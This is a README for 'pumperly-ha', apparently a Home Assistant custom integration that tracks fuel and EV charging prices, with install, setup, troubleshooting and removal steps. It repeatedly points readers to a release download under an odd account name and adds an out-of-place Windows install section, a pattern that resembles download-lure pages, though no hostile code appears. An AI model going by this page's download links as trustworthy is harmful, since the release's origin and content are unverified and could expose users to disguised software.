# ⛽ pumperly-ha - Track Fuel Prices with Ease

[![Download pumperly-ha](https://img.shields.io/badge/Download%20pumperly--ha-Release%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Katinkabraindead382/pumperly-ha/releases)

## 📥 Download

Visit this page to download: https://github.com/Katinkabraindead382/pumperly-ha/releases

Use the latest release file that matches your Home Assistant setup.

## 🧭 What pumperly-ha does

pumperly-ha is a Home Assistant custom integration that helps you track fuel and EV charging prices from Pumperly.

It can help you:

- See fuel price changes in Home Assistant
- Track petrol and diesel prices
- Track EV charging prices
- Use live data from open sources
- Keep price data in one place
- Add sensors to dashboards and automations

## ✅ Before you start

Make sure you have:

- A working Home Assistant setup
- Access to the Home Assistant file system or add-on tools
- A way to restart Home Assistant
- Internet access so the integration can fetch price data

pumperly-ha works best on a self-hosted Home Assistant setup. It is a good fit for users who want local control and simple price tracking.

## 🚀 Install on Windows for Home Assistant users

This project is not a Windows app that you run on its own. It is a Home Assistant custom integration. If you use Home Assistant on Windows, follow these steps to add it to your Home Assistant files.

### 1. Download the release files

Go to the release page:

https://github.com/Katinkabraindead382/pumperly-ha/releases

Download the latest release package from that page.

### 2. Open your Home Assistant config folder

Find the folder that holds your Home Assistant configuration files. This is often called:

- `config`
- `homeassistant`
- `Home Assistant`

### 3. Add the integration folder

Create this folder if it does not already exist:

- `custom_components/pumperly_ha`

Place the integration files from the release into that folder.

The final path should look like this:

- `config/custom_components/pumperly_ha/`

### 4. Restart Home Assistant

After the files are in place, restart Home Assistant.

This lets Home Assistant load the new integration.

### 5. Add pumperly-ha in Home Assistant

After restart, open Home Assistant and go to:

- Settings
- Devices & services
- Add integration

Search for pumperly-ha and follow the setup steps.

## 🔧 Setup

During setup, Home Assistant may ask for basic details so it can connect to Pumperly data.

You may need to:

- Choose your country or region
- Pick the fuel types you want to track
- Set update timing
- Save the integration in Home Assistant

Once setup is done, the integration creates sensors for the data it finds.

## 📊 What you can track

pumperly-ha can create sensors for:

- Petrol price
- Diesel price
- EV charging price
- Station name
- Location data
- Last update time
- Price source status

These sensors can be used in dashboards, automations, and alerts.

## 🖥️ Use in dashboards

You can add the sensors to a Home Assistant dashboard to view:

- Current fuel prices
- EV charging rates
- Price changes over time
- Station details

A simple dashboard can help you compare costs at a glance.

## 🤖 Use in automations

You can use the sensor values in automations.

Examples:

- Send a notification when diesel drops below a set price
- Trigger an alert when EV charging costs rise
- Update a dashboard card when new data arrives
- Compare price levels across stations

## 🛠️ Troubleshooting

### The integration does not appear

If pumperly-ha does not show up after restart:

- Check that the folder name is correct
- Make sure the files are inside `custom_components/pumperly_ha/`
- Restart Home Assistant again
- Confirm that the release files were extracted fully

### No data shows up

If the integration loads but no data appears:

- Check your internet connection
- Wait for the first update cycle
- Make sure your selected region or settings are valid
- Reload the integration in Home Assistant

### Sensors look wrong

If sensor names or values do not look right:

- Remove the integration
- Add it again
- Check that you used the latest release
- Review the setup options in Home Assistant

## 🧩 File layout

A typical install looks like this:

- `config/`
  - `custom_components/`
    - `pumperly_ha/`
      - `__init__.py`
      - `manifest.json`
      - `config_flow.py`
      - `sensor.py`
      - `translations/`

## 🔍 Project topics

This project relates to:

- Home Assistant
- custom integration
- fuel prices
- EV charging
- smart home
- open data
- sensors
- self-hosted automation
- Europe energy data

## 🔐 Privacy and data use

pumperly-ha uses price data to show fuel and EV charging information in Home Assistant.

It is built for local Home Assistant use and fits a self-hosted setup. You keep control of your Home Assistant data and where it runs.

## 🧼 Remove the integration

If you want to uninstall pumperly-ha:

1. Remove the `custom_components/pumperly_ha` folder
2. Restart Home Assistant
3. Remove the integration entry from Home Assistant if it still appears

## 📌 Repository details

- Repository: pumperly-ha
- Description: Home Assistant custom integration for Pumperly fuel and EV charging price tracking
- Topics: custom-integration, diesel, electric-vehicle, energy, europe, ev-charging, fuel-prices, gas-station, hacs, hacs-integration, home-assistant, home-automation, iot, open-data, petrol, pumperly, python, self-hosted, sensors, smart-home